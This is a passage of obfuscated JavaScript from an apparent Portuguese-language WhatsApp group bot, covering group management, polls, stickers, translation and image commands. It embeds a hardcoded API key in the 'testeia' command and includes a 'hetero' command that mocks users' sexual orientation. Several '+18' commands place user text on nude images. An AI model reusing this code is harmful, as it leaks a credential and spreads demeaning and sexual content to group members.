                  case "nao registrado":
                    _0x4d8738 = _0x550f98.filter(_0xe04b7a => !rg_aluguel.some(_0x2f8b63 => _0x2f8b63.id_gp === _0xe04b7a.id && !_0xe04b7a.isCommunity && !_0xe04b7a.isCommunityAnnounce)).map(_0x105062 => _0x105062.id);
                    break;
                  case "em dia":
                    _0x4d8738 = rg_aluguel.filter(_0x358907 => _0x358907.vencimento > _0x2665d7).map(_0x3b42bb => _0x3b42bb.id_gp);
                    break;
                  case "vencido":
                    _0x4d8738 = rg_aluguel.filter(_0x9c0672 => _0x9c0672.vencimento <= _0x2665d7).map(_0x3adb17 => _0x3adb17.id_gp);
                    break;
                  case "todos":
                    _0x4d8738 = rg_aluguel.map(_0x12eda8 => _0x12eda8.id_gp);
                    break;
                  default:
                    return _0x50740b("Por favor, forneça uma opção válida: 'nao registrado', 'em dia', 'vencido' ou 'todos'.");
                }
                _0x50740b("Saindo dos grupos da categoria: " + _0x4bb624);
                for (let _0x126410 = 0; _0x126410 < _0x4d8738.length; _0x126410++) {
                  await sleep(2000);
                  let _0x31070c = _0x4d8738[_0x126410];
                  if (!_0x550f98.some(_0x2048b3 => _0x2048b3.id === _0x31070c && (_0x2048b3.isCommunity || _0x2048b3.isCommunityAnnounce))) {
                    const _0x484b7d = {
                      text: "Por motivos pessoais e para evitar bugs, o bot irá sair do grupo. Se desejar adicionar o bot novamente, entre em contato com o meu dono.\n\nwa.me/" + numerodono_ofc
                    };
                    _0x5196be.sendMessage(_0x31070c, _0x484b7d);
                    setTimeout(() => _0x5196be.groupLeave(_0x31070c), 5000);
                  }
                }
              }
              break;
            case "hetero":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x5c6233) {
                  return _0x50740b("Comando disponível apenas no modobrincadeira. Use " + _0x141936 + "modobrincadeira 1");
                }
                const _0x35e616 = {
                  text: '🗿',
                  key: _0xd2050d.key
                };
                const _0x3d6d9d = {
                  react: _0x35e616
                };
                await _0x5196be.sendMessage(_0x346d97, _0x3d6d9d);
                let _0xbf6b05 = Math.floor(Math.random() * 100);
                let _0x5bef6e = _0xbf6b05 < 5 ? "Você não é Hetero" : _0xbf6b05 < 15 ? "Ta queimando a rosca né" : _0xbf6b05 < 25 ? "🤨 Suspeito" : _0xbf6b05 < 38 ? "Tenho minhas dúvidas" : _0xbf6b05 < 47 ? "Abaixo da metade, suspeito" : _0xbf6b05 < 55 ? "Mais que a metade, Aceitável" : _0xbf6b05 < 71 ? "Você é hetero" : _0xbf6b05 < 89 ? "Hetero Mestre" : _0xbf6b05 < 100 ? "Hetero supremo 🫡🏳️" : '';
                _0x5196be.sendMessage(_0x346d97, {
                  'text': "❰ Pesquisando a sua ficha de hetero: @" + _0x1911ab.split('@')[0] + " aguarde... ❱",
                  'mentions': [_0x1911ab]
                });
                const _0x47edb6 = {
                  url: "https://telegra.ph/file/4c6939ca6f4b5f12685f6.jpg"
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x47edb6,
                  'caption': "O quanto você é hetero?\n\n「 @" + _0x1911ab.split('@')[0] + " 」 Você é: " + _0xbf6b05 + "% \n" + _0x5bef6e,
                  'mentions': [_0x1911ab]
                });
              }
              break;
            case "tirar-fechar-abrirgp":
            case "rm-fechar-abrirgp":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("❌ Você não é um administrador para usar este comando. Desculpe, talvez um dia você seja 😂");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("Eu não sou um administrador para executar esta ação.");
                }
                let _0x2afdca = opengp.findIndex(_0x234aa3 => _0x234aa3.id === _0x346d97);
                if (_0x2afdca > -1) {
                  opengp.splice(_0x2afdca, 1);
                  fs.writeFileSync("./DADOS/json/opengp.json", JSON.stringify(opengp, null, 2));
                  _0x50740b("Horário automático de fechamento desativado.");
                  setTimeout(() => {
                    process.exit();
                  }, 1000);
                } else {
                  _0x50740b("Como você quer desligar se nunca ligou kkkkk");
                }
              }
              break;
            case "verificar-horario":
            case "check-time":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                let _0x5299b0 = opengp.find(_0x2aeb1e => _0x2aeb1e.id === _0x346d97);
                if (_0x5299b0) {
                  let _0x121a15 = _0x5299b0.F.join(", ");
                  let _0x3d187b = _0x5299b0.A.join(", ");
                  _0x50740b("Horário programado para fechar o grupo: " + _0x121a15 + "\nHorário programado para abrir o grupo: " + _0x3d187b);
                } else {
                  _0x50740b("O horário automático de fechamento não está ativado neste grupo.");
                }
              }
              break;
            case "fechar-abrirgp":
            case "horario-open-close":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando é apenas para grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("❌ Você não é um administrador para usar este comando. Desculpe, talvez um dia você seja 😂");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("Eu não sou um administrador para executar esta ação.");
                }
                let [_0x12650e, _0x28303f] = _0x11e99e.split('|');
                if (!_0x12650e || !_0x28303f) {
                  return _0x50740b("Informe o horário de início e fim no formato hora:minuto | hora:minuto\nexemplo: 11:01|12:05");
                }
                if (!/^([01]\d|2[0-3]):([0-5]\d)$/.test(_0x28303f) || !/^([01]\d|2[0-3]):([0-5]\d)$/.test(_0x12650e)) {
                  return _0x50740b("Formato de hora inválido. Use o formato hora:minuto|hora:minuto.\nexemplo: 11:01|12:05");
                }
                let _0x42227f = opengp.findIndex(_0x5b1f60 => _0x5b1f60.id === _0x346d97);
                if (_0x42227f > -1) {
                  if (!opengp[_0x42227f].F) {
                    opengp[_0x42227f].F = [];
                  }
                  if (!opengp[_0x42227f].A) {
                    opengp[_0x42227f].A = [];
                  }
                  opengp[_0x42227f].F.push(_0x12650e);
                  opengp[_0x42227f].A.push(_0x28303f);
                  fs.writeFileSync("./DADOS/json/opengp.json", JSON.stringify(opengp, null, 2));
                  return _0x50740b("*HORÁRIO DE ABRIR E FECHAR GP ATUALIZADO:*\n\n*FECHAMENTO:* " + _0x12650e + "\n*ABERTURA:* " + _0x28303f);
                } else {
                  const _0x25d7b9 = {
                    id: _0x346d97,
                    F: [_0x12650e],
                    A: [_0x28303f]
                  };
                  opengp.push(_0x25d7b9);
                  fs.writeFileSync("./DADOS/json/opengp.json", JSON.stringify(opengp, null, 2));
                  return _0x50740b("*HORÁRIO PARA FECHAR E ABRIR O GRUPO DEFINIDO COM SUCESSO:*\n\n*FECHAMENTO:* " + _0x12650e + "\n*ABERTURA:* " + _0x28303f);
                }
                setTimeout(() => {
                  process.exit();
                }, 1000);
              }
              break;
            case "eujaeununca":
              {
                if (!_0x5c6233) {
                  return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for, apenas digite " + _0x141936 + "modobrincadeira 1");
                }
                let _0x4f6acd = eununcaeuja[Math.floor(Math.random() * eununcaeuja.length)];
                const _0x576cd0 = {
                  messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk="
                };
                const _0x26b0dd = {
                  optionName: "*✅ EU JA ✅*"
                };
                const _0x5a7929 = {
                  optionName: "*❎ EU NUNCA ❎*"
                };
                const _0x44b45b = {
                  options: [_0x26b0dd, _0x5a7929],
                  name: '*' + _0x4f6acd + '*',
                  selectableOptionsCount: 0x1
                };
                const _0x447811 = {
                  messageContextInfo: _0x576cd0,
                  pollCreationMessage: _0x44b45b
                };
                _0x5196be.relayMessage(_0x346d97, _0x447811, {});
              }
              break;
            case "imc":
              let _0xa8ccff = _0x11e99e.replace(/,/g, '.');
              let _0x161714 = /^[\d]+([\.,][\d]+)?\|[\d]+([\.,][\d]+)?$/.test(_0xa8ccff);
              if (!_0x161714) {
                return _0x50740b("Por favor, insira a string no formato correto (exemplo: '74|1.72').");
              }
              let [_0x257df0, _0x492030] = _0xa8ccff.split('|');
              pesoNum = parseFloat(_0x257df0);
              alturaNum = parseFloat(_0x492030);
              if (isNaN(pesoNum) || isNaN(alturaNum)) {
                return _0x50740b("Por favor, insira valores numéricos para peso e altura.");
              }
              imc = pesoNum / Math.pow(alturaNum, 2);
              let _0x481858 = "Indefinido";
              if (imc < 18.5) {
                _0x481858 = "Abaixo do peso";
              } else {
                if (imc < 24.9) {
                  _0x481858 = "Peso normal";
                } else {
                  if (imc < 29.9) {
                    _0x481858 = "Sobrepeso";
                  } else {
                    if (imc < 34.9) {
                      _0x481858 = "Obesidade Grau I";
                    } else {
                      if (imc < 39.9) {
                        _0x481858 = "Obesidade Grau II";
                      } else {
                        _0x481858 = "Obesidade Grau III";
                      }
                    }
                  }
                }
              }
              _0x50740b("Olá " + _0x671b4b + " pelas minhas contas\n\nSeu peso sendo " + pesoNum + "Kg\nE sua altura " + alturaNum + "m\n\nVocê está " + _0x481858 + '.');
              break;
            case "logosite":
              {
                if (!_0x11e99e || _0x11e99e.includes("http")) {
                  return _0x50740b("Faltando a url do site que quer tirar print, Exemplo: " + (_0x141936 + _0x267d4b) + " google.com\n\nNão esqueça de tirar o https se o site tiver");
                }
                _0x50740b(enviar.espere);
                try {
                  _0x5196be.sendMessage(_0x346d97, {
                    'image': {
                      'url': "https://logo.clearbit.com/" + _0x11e99e
                    }
                  });
                } catch (_0x104959) {
                  _0x50740b("Não foi possível fazer o download da logo do site");
                }
              }
              break;
            case "listacomunidades":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x33286a && !_0xf59944 && !_0x3f2f63) {
                return _0x50740b(enviar.msg.premium);
              }
              _0xbce007 = await _0x5196be.groupFetchAllParticipating();
              _0x32d8bd = Object.entries(_0xbce007).slice(0).map(_0xae2ad9 => _0xae2ad9[1]);
              communities = _0x32d8bd.filter(_0x324426 => _0x324426.isCommunity);
              communities.sort((_0x52ac21, _0x16a159) => _0x52ac21.subject.localeCompare(_0x16a159.subject));
              teksComuni = "*LISTA DE COMUNIDADES*\n*Total de Comunidades* : " + communities.length + "\n\n";
              for (let _0x36213c = 0; _0x36213c < communities.length; _0x36213c++) {
                teksComuni += "• *Comunidade* : " + _0x36213c + "\n• *Nome da Comunidade* : " + communities[_0x36213c].subject + "\n• *Id da Comunidade* : " + communities[_0x36213c].id + "\n• *Criada* : " + moment(('' + communities[_0x36213c].creation) * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss") + "\n• *Total de Membros* : " + communities[_0x36213c].participants.length + "\n\n";
              }
              _0x50740b(teksComuni);
              break;
            case "listagp2":
              {
                if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("```SOMENTE MEU DONO LINDÃO```");
                }
                let _0x3630fe = await _0x5196be.groupFetchAllParticipating();
                var _0x32d8bd = Object.entries(_0x3630fe).slice(0).map(_0x48b5a0 => _0x48b5a0[1]);
                var _0x12914f = _0x32d8bd.map(_0x55bf4e => _0x55bf4e);
                _0x12914f.sort((_0x47b906, _0x40deb4) => _0x47b906[0] < _0x40deb4.length);
                teks1 = "*LISTA DE GRUPOS*\n*Total de Grupos* : " + _0x12914f.length + "\n\n";
                for (let _0x32ea4f = 0; _0x32ea4f < _0x12914f.length; _0x32ea4f++) {
                  var _0x20476e = await _0x5196be.groupMetadata(_0x12914f[_0x32ea4f].id);
                  try {
                    var _0x42e5b5 = await _0x5196be.groupInviteCode(_0x12914f[_0x32ea4f].id);
                  } catch {
                    var _0x42e5b5 = "Não foi possivel puxar o link";
                  }
                  let _0x55d69f = _0x20476e.subjectOwner;
                  teks1 += "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n• *Grupo* : " + _0x32ea4f + "\n• *Nome do Grupo* : " + _0x12914f[_0x32ea4f].subject + "\n• *Id do Grupo* : " + _0x12914f[_0x32ea4f].id + "\n• Link do grupo: https://chat.whatsapp.com/" + _0x42e5b5 + "\n• *Dono_Ofc*: " + _0x55d69f + "\n• *Criado* : " + moment(('' + _0x12914f[_0x32ea4f].creation) * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss") + "\n• *Total de Membros* : " + _0x12914f[_0x32ea4f].participants.length + "\n\n";
                }
                _0x50740b(teks1);
              }
              break;
            case "figpack":
            case "figauthor":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("KD a mensagem para eu por na legenda da figurinha");
              }
              let _0x52ecfc = _0x11e99e.trim().replace(/\n/g, "\n");
              if (_0x267d4b === "figpack") {
                legendafig.FigPack = _0x52ecfc;
                _0x50740b("legenda pack das figurinhas alterada.");
              } else if (_0x267d4b === "figauthor") {
                legendafig.FigAuthor = _0x52ecfc;
                _0x50740b("legenda author das figurinhas alterada.");
              }
              fs.writeFileSync("./DADOS/json/legendafig.json", JSON.stringify(legendafig, null, 2));
              setTimeout(() => {
                process.exit();
              }, 1000);
              break;
            case "mediafire2":
              try {
                if (!_0x11e99e.includes("mediafire.com")) {
                  return _0x50740b("Faltando o link do mediafire para download do arquivo, cade?");
                }
                let {
                  mediafiredl: _0x5a89f2
                } = require("@bochilteam/scraper");
                let _0x446034 = await _0x5a89f2(_0x11e99e);
                slapo = await parseInt(_0x446034.filesize);
                if (slapo >= 300000) {
                  return _0x50740b("Arquivo excede o Limite Programado de 300MB");
                }
                _0x50740b("Enviando: " + _0x446034.filename + "\nUpload: " + _0x446034.aploud + "\nTipo De Arquivo: " + _0x446034.filetype + "\nPeso: " + _0x446034.filesizeH);
                const _0x36ab96 = {
                  url: _0x446034.url
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'document': _0x36ab96,
                  'mimetype': "application/" + _0x446034.ext,
                  'fileName': _0x446034.filename
                })["catch"](_0x5a779a => {
                  return _0x50740b("Erro.." + _0x5a779a);
                });
              } catch (_0x2c9ce2) {
                return _0x50740b("Erro.." + _0x2c9ce2);
              }
              break;
            case "figemoji":
            case "figroblox":
            case "figmeme":
            case "figanime":
            case "figcoreana":
            case "figraiva":
            case "figengracada":
            case "figdesenho":
            case "fig":
              {
                if (!_0x11e99e) {
                  return _0x50740b("Insira a quantidade de figurinhas que deseja que eu envie.");
                }
                if (!Number(_0x23d865[0]) || Number(_0x11e99e.trim()) > 5) {
                  return _0x50740b("Digite a quantidade de figurinhas que deseja que eu envie.. não pode mais de 5..");
                }
                async function _0x30b20f(_0x34ae79) {
                  let _0x3ad8ed = await fetch("https://api.github.com/repos/badDevelopper/figus2/contents/" + _0x34ae79);
                  let _0x5cbe61 = await _0x3ad8ed.json();
                  return _0x5cbe61;
                }
                let _0x1e75f7 = await _0x30b20f(_0x267d4b);
                for (let _0x23f39d = 0; _0x23f39d < _0x11e99e; _0x23f39d++) {
                  delay(2000);
                  let _0x371c37 = Math.floor(Math.random() * _0x1e75f7.length);
                  let _0xb7b0c5 = "https://raw.githubusercontent.com/badDevelopper/figus2/main/" + _0x267d4b + '/' + _0x1e75f7[_0x371c37].name;
                  const _0x4f664a = {
                    url: _0xb7b0c5
                  };
                  const _0x16b1b7 = {
                    sticker: _0x4f664a
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x16b1b7);
                }
              }
              break;
            case "aceitarmembro":
              try {
                let _0x38b1d6 = await _0x5196be.groupRequestParticipantsList(_0x346d97);
                if (!_0x38b1d6 || !Array.isArray(_0x38b1d6) || _0x38b1d6.length === 0) {
                  return _0x50740b("Nenhum membro na lista de solicitação para entrar no grupo.");
                }
                let _0x450f34 = await _0x5196be.groupRequestParticipantsUpdate(_0x346d97, ['' + _0x38b1d6[0].jid], "approve");
                if (_0x450f34 === "success") {
                  _0x50740b("Solicitação aprovada com sucesso.");
                } else {
                  _0x50740b("Ocorreu um erro ao aprovar a solicitação.");
                }
              } catch (_0x5cfcd0) {
                console.error(_0x5cfcd0);
                _0x50740b("Ocorreu um erro ao processar a solicitação.");
              }
              break;
            case "testelg":
              var _0x3ddb94 = await _0x5196be.groupRequestParticipantsList(_0x346d97);
              console.log(_0x3ddb94);
              break;
            case "traduzir":
              let {
                translate: _0x4f2c1e
              } = require("@vitalets/google-translate-api");
              _0x4f2c1e(_0x11e99e, {
                'to': "pt-br"
              }).then(_0x2dd5e0 => _0x50740b("tradução: " + _0x2dd5e0.text))["catch"](_0x4080dd => _0x50740b("Erro ao traduzir:", _0x4080dd));
              break;
            case "atualizarbot":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                let _0x23a5f3 = require("util");
                let _0xd5aedc = _0x23a5f3.promisify(exec);
                _0x50740b("ATUALIZANDO SEU BOT, AGUARDE...");
                _0xd5aedc("bash atualizar2.sh", {
                  'maxBuffer': 10485760
                }).then(({
                  stdout: _0x32d4be,
                  stderr: _0x2b191d
                }) => {
                  if (_0x2b191d && !_0x2b191d.includes("refusing to remove '.' or '..' directory")) {
                    _0x50740b("OCORREU UM ERRO DURANTE O PROCESSO DE ATUALIZAÇÃO: " + _0x2b191d);
                  } else {
                    _0x50740b("PROCESSO DE ATUALIZAÇÃO CONCLUÍDO SEM ERROS, IREI REINICIAR...");
                    setTimeout(() => {
                      console.log("Reiniciando...");
                      process.exit();
                    }, 1000);
                  }
                })["catch"](_0xef24c0 => {
                  console.error("Erro durante a execução do script atualizar.sh:", _0xef24c0);
                  _0x50740b("OCORREU UM ERRO DURANTE O PROCESSO DE ATUALIZAÇÃO: " + _0xef24c0.message)["catch"](_0x54256b => {
                    console.error("Erro ao enviar a resposta de erro:", _0x54256b);
                  });
                  setTimeout(() => {
                    console.log("Encerrando processo devido a erro...");
                    process.exit();
                  }, 1000);
                });
              }
              break;
            case "plaq1":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b(_0x141936 + "plaq1 e digite o seu nome");
              }
              teks = _0x3ac611.slice(6);
              if (teks.length > 15) {
                return _0x50740b("O texto é longo, até 15 caracteres");
              }
              _0x50740b(enviar.espere);
              _0x24e1d3 = "https://raptibef.sirv.com/images%20(3).jpeg?text.0.text=" + teks + "&text.0.position.gravity=center&text.0.position.x=19%25&text.0.size=45&text.0.color=000000&text.0.opacity=55&text.0.font.family=Crimson%20Text&text.0.font.weight=300&text.0.font.style=italic&text.0.outline.opacity=21";
              const _0x2ca38b = {
                url: _0x24e1d3
              };
              const _0x46f73b = {
                image: _0x2ca38b,
                caption: " *Plaquinha feita ✓* "
              };
              const _0x42e38c = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x46f73b, _0x42e38c);
              break;
            case "plaq2":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b(_0x141936 + "plaq2 e digite o seu nome");
              }
              teks = _0x3ac611.slice(7);
              if (teks.length > 15) {
                return _0x50740b("O texto é longo, até 15 caracteres");
              }
              _0x50740b(enviar.espere);
              _0x24e1d3 = "https://raptibef.sirv.com/images%20(1).jpeg?profile=Zanga%202.0&text.0.text=" + teks;
              const _0x5c052e = {
                url: _0x24e1d3
              };
              const _0x589f6d = {
                image: _0x5c052e,
                caption: " *Plaquinha feita ✓* "
              };
              const _0x481c00 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x589f6d, _0x481c00);
              break;
            case "plaq3":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b(_0x141936 + "plaq3 e digite o seu nome");
              }
              teks = _0x3ac611.slice(7);
              if (teks.length > 15) {
                return _0x50740b("O texto é longo, até 15 caracteres");
              }
              _0x50740b(enviar.espere);
              _0x24e1d3 = "https://raptibef.sirv.com/images.jpeg?profile=Zanga%203.0&text.0.text=" + teks + "&text.0.outline.blur=63";
              const _0x4ff984 = {
                url: _0x24e1d3
              };
              const _0x225037 = {
                image: _0x4ff984,
                caption: " *Plaquinha feita ✓* "
              };
              const _0x3e6c33 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x225037, _0x3e6c33);
              break;
            case "plaq4":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b(_0x141936 + "plaq4 e digite o seu nome");
              }
              teks = _0x3ac611.slice(7);
              if (teks.length > 10) {
                return _0x50740b("O texto é longo, até 10 caracteres");
              }
              _0x50740b(enviar.espere);
              _0x24e1d3 = "https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=" + teks + "&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter";
              const _0x402bc1 = {
                url: _0x24e1d3
              };
              const _0x4ffb9e = {
                image: _0x402bc1,
                caption: " *Plaquinha feita ✓* "
              };
              const _0xa04427 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x4ffb9e, _0xa04427);
              break;
            case "plaq5":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b(_0x141936 + "plaq5 e digite o seu nome");
              }
              teks = _0x3ac611.slice(7);
              if (teks.length > 15) {
                return _0x50740b("O texto é longo, até 15 caracteres");
              }
              _0x50740b(enviar.espere);
              const _0x1ab98f = {
                url: "https://umethroo.sirv.com/peito1.jpg?text.0.text=" + teks + "&text.0.position.x=-4%25&text.0.position.y=-6%25&text.0.size=14&text.0.color=000000&text.0.font.family=Shadows%20Into%20Light&text.0.font.weight=700"
              };
              const _0x124f5b = {
                image: _0x1ab98f,
                caption: " *Plaquinha feita ✓* "
              };
              const _0x14480d = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x124f5b, _0x14480d);
              break;
            case "nsfwts":
              try {
                if (!_0x2f3424) {
                  return _0x50740b("❌Somente com o modo+18 ativado❌");
                }
                blaLN = await fetchJson("https://raw.githubusercontent.com/Salientekill/figurinhas/main/animes/nsfw/" + _0x11e99e + ".json");
                blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
                _0x3c2c3a(_0x346d97, blarnd, "🔥 𝐎 𝐍𝐒𝐅𝐖 𝐐𝐔𝐄 𝐕𝐎𝐂𝐄̂ 𝐏𝐄𝐃𝐈𝐔 🔥", '' + NomeDoBot, [{
                  'buttonId': _0x141936 + _0x267d4b + " " + _0x11e99e,
                  'buttonText': {
                    'displayText': "🔥 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎🔥 "
                  },
                  'type': 0x1
                }], _0x212ce6);
              } catch (_0xe77936) {
                console.log(_0xe77936);
                _0x50740b("🤖 𝐀𝐏𝐈 𝐂𝐀𝐈𝐔 🤖");
              }
              break;
            case "testeia":
              if (!issupre) {
                return _0x50740b("comando exclusivo do meu criador por conter poucas solicitações diárias (100)");
              }
              const _0x4a0cd7 = {
                prompt: '' + _0x11e99e,
                samples: 0x1,
                scheduler: "dpmpp_sde_ancestral",
                num_inference_steps: 0x19,
                guidance_scale: 0x9,
                seed: 0x222f58f9,
                img_width: 0x200,
                img_height: 0x300,
                base64: true
              };
              _0x5aeb20 = _0x4a0cd7;
              async function _0x39bd0e() {
                try {
                  _0x505457 = await axios.post("https://api.segmind.com/v1/sd1.5-colorful", _0x5aeb20, {
                    'headers': {
                      'x-api-key': "SG_59b0cef389e05e69"
                    }
                  });
                  if (typeof _0x505457.data.image === "string") {
                    base64Data = _0x505457.data.image.replace(/^data:image\/\w+;base64,/, '');
                    imageBuffer = Buffer.from(base64Data, "base64");
                    fs.writeFileSync("imagem.jpg", imageBuffer);
                    uploadLink = await upload(imageBuffer);
                    const _0x1de441 = {
                      url: uploadLink
                    };
                    const _0x2f4d7e = {
                      image: _0x1de441,
                      caption: "*aqui está sua imagem gerada*"
                    };
                    const _0x431a9e = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, _0x2f4d7e, _0x431a9e);
                    fs.unlinkSync("imagem.jpg");
                  } else {
                    console.error("A resposta não contém uma base64 de imagem válida.");
                    _0x50740b("Erro ao gerar a imagem. Tente novamente mais tarde.");
                  }
                } catch (_0x75c069) {
                  console.error("Error:", _0x75c069.response ? _0x75c069.response.data : _0x75c069.message);
                  _0x50740b("Ocorreu um erro ao processar sua solicitação. Tente novamente mais tarde.");
                }
              }
              _0x39bd0e();
              break;
            case "setlinkdivu":
              if (!_0x11e99e) {
                return _0x50740b("cade o link do Grupo?");
              }
              if (!_0xf59944 && !_0x3eefd0) {
                return _0x50740b("Só dono pode utilizar este comando...");
              }
              if (_0xd2050d.key.fromMe) {
                return;
              }
              fs.writeFileSync("./DADOS/json/linkdivu.json", JSON.stringify([_0x23d865.join(" ")]));
              _0x50740b("link Definido");
              break;
            case "divugg":
              if (!_0xf59944 && !_0x3eefd0) {
                return _0x50740b("Só dono pode utilizar este comando...");
              }
              if (_0xd2050d.key.fromMe) {
                return;
              }
              var _0x24e1d3 = JSON.parse(fs.readFileSync("./DADOS/json/linkdivu.json"));
              try {
                var _0x150891 = await _0x5196be.profilePictureUrl(_0x346d97, "image");
              } catch {
                var _0x150891 = "https://telegra.ph/file/6ca032835ed7a16748b6f.jpg";
              }
              participants = _0x89cd51 ? (await _0x3071b5?.["participants"]) || '' : '';
              teks = "⚠️ *MUDANÇA DE GRUPO* ⚠️\n\r\n*NÓS, ADMINISTRADORES DO GRUPO: " + _0x3baffe + " ESTAMOS TRANSFERINDO TODOS OS MEMBROS PARA O NOVO GRUPO*.\n\n\rPOR FAVOR AO ENTRAR NO NOVO SAIA DESSE 🤗";
              linkgp = '' + _0x24e1d3;
              var _0x3ca163 = 0;
              var _0x53c49c;
              _0x53c49c = setInterval(() => {
                _0x3ca163++;
                if (_0x3ca163 == 3) {
                  clearInterval(_0x53c49c);
                  setTimeout(() => {}, 2500);
                }
                const _0x34e502 = {
                  url: "https://telegra.ph/file/e8bbd616f7509f641def9.jpg"
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x34e502,
                  'mimetype': "image/jpeg",
                  'caption': teks,
                  'contextInfo': {
                    'mentionedJid': participants.map(_0x244168 => _0x244168.id),
                    'externalAdReply': {
                      'title': "CLICA AQUI PARA VOCÊ PARTICIPAR DO NOVO GRUPO.",
                      'mediaType': 0x1,
                      'body': '',
                      'reviewType': "PHOTO",
                      'thumbnailUrl': _0x150891,
                      'sourceUrl': linkgp,
                      'showAdAttribution': true
                    }
                  }
                });
              }, 500);
              break;
            case "animets":
              try {
                blaLN = await fetchJson("https://raw.githubusercontent.com/Salientekill/figurinhas/main/animes/jsons/" + _0x11e99e + ".json");
                blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
                const _0x1a0ff1 = {
                  url: blarnd
                };
                const _0x1f2004 = {
                  image: _0x1a0ff1,
                  caption: "🇯🇵 𝐎 𝐀𝐍𝐈𝐌𝐄 𝐐𝐔𝐄 𝐕𝐎𝐂𝐄̂ 𝐏𝐄𝐃𝐈𝐔 🎌"
                };
                const _0x440bd8 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x1f2004, _0x440bd8);
              } catch (_0x597e02) {
                console.log(_0x597e02);
                _0x50740b("🤖 𝐀𝐏𝐈 𝐂𝐀𝐈𝐔 🤖");
              }
              break;
            case "prox_jogo":
              if (!_0x11e99e) {
                return _0x50740b("cade o time?");
              }
              const _0x266071 = {
                "São Paulo": "sao-paulo",
                "América-MG": "america-mg",
                "Atlético-MG": "atletico-mg"
              };
              timeMap = _0x266071;
              qModified = Object.keys(timeMap).reduce((_0x25c5a7, _0x242041) => _0x25c5a7.replace(new RegExp(_0x242041, 'ig'), timeMap[_0x242041]), _0x11e99e.toLowerCase());
              encodedQModified = encodeURIComponent(qModified);
              try {
                let _0x9485aa = await fetchJson("http://api.baddeveloper.space:25572/api/prox_jogo?time=" + encodedQModified);
                proxJogos = _0x9485aa.table;
                _0x50740b(proxJogos);
              } catch (_0x46d4a1) {
                _0x50740b("Deu Ruim:", _0x46d4a1.message);
                return _0x50740b("Erro ao obter os dados do servidor.");
              }
              break;
            case "gif/anime":
              try {
                numbr = Math.floor(Math.random() * 200) + 1;
                _0x926ec9 = await getBuffer("https://raw.githubusercontent.com/YajiirDev/animes/main/anime/gif/animegif/" + numbr + ".gif");
                let _0x387b2d = getRandom(".gif");
                let _0x566f75 = getRandom(".mp4");
                fs.writeFileSync(_0x387b2d, _0x926ec9);
                exec("ffmpeg -i " + _0x387b2d + " -movflags faststart -c:v libx264 -b:v 6M -s 1920x1080 -pix_fmt yuv420p -profile:v high " + _0x566f75, async _0x34e660 => {
                  gif = fs.readFileSync(_0x566f75);
                  _0x36d5cf = await upload(gif);
                  console.log(_0x36d5cf);
                  const _0x422220 = {
                    url: _0x36d5cf
                  };
                  const _0x137651 = {
                    video: _0x422220,
                    gifPlayback: true,
                    caption: "🔥Aqui Está Seu Gif🔥"
                  };
                  const _0x1bc4f4 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x137651, _0x1bc4f4);
                  setTimeout(async function () {
                    fs.unlinkSync(_0x387b2d);
                    fs.unlinkSync(_0x566f75);
                  }, 3000);
                });
              } catch (_0x158c55) {
                console.log("Error :", color(_0x158c55, "red"));
                _0x50740b(" *ERROR* ");
              }
              break;
